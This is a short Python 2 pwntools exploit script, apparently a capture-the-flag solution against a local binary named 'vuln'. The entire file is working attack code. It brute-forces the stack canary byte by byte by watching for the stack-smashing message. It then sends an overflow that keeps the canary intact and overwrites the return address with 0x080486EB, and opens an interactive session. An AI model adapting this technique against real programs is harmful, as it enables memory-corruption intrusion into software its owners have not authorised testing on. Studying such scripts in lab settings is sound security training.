#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vuln')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x08048869
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']

canary = ''
while len(canary) < 4:
    for i in range(255):
        tmp_canary = canary + chr(i)
        io = start()
        io.sendline('100')
        io.recvuntil('Input> ')
        io.send('A'*32 + tmp_canary)

        if '***' not in io.recv():
            canary = tmp_canary
            log.success('Found char ' + chr(i))
            io.close()
            break
        io.close()
print (canary)

io = start()
io.sendline('100')
io.send('A' * 32 + canary + 'BBBBCCCCDDDDEEEE' + p32(0x080486EB))
io.interactive()

